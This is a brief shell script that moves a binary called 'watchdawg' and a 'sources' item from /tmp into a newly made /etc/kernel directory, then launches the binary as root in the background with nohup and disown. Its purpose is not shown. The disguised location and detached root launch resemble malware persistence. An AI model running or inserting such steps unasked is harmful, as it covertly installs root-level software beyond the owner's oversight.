sudo chmod 700 /tmp/watchdawg
sudo mkdir -p /etc/kernel
sudo mv /tmp/watchdawg /etc/kernel
sudo mv /tmp/sources /etc/kernel
nohup sudo /etc/kernel/watchdawg /etc/kernel/init-state /etc/kernel/sources > /etc/kernel/out 2>&1 & disown
printf "done\n"
